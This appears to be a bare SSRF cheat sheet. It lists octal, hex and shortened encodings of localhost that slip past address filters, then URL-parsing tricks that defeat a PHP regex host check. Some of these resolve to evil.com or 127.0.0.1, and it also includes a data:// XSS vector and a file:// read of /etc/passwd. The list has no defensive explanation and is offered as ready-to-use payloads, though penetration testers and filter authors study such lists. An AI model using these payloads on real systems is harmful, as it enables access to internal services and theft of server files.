### SSRF-localhost
- 0
- 127.00.1
- 127.0.01
- 0.00.0
- 0.0.00
- 127.1.0.1
- 127.10.1
- 127.1.01
- 0177.1
- 0177.0001.0001
- 0x0.0x0.0x0.0x0
- 0000.0000.0000.0000
- 0x7f.0x0.0x0.0x1
- 0177.0000.0000.0001
- 0177.0001.0000..0001
- 0x7f.0x1.0x0.0x1
- 0x7f.0x1.0x1
- localtest.me

### SSRF && Redirect && CORS
#### (preg_match('/google\.com$/', $host))
- evil.com:80\google.com  => evil.com
- evil.com:80;google.com  => evil.com
- evil.com:80,google.com  => evil.com
- evil$google.com => evil.com
- data://text.google.com/plain;base64,<...b64...> (PHP && XSS)
- http://foo@[cafebabe.cf]@google.com:3306/ => cafebabe.cf => 127.0.0.1
- file://www.google.com/etc/passwd
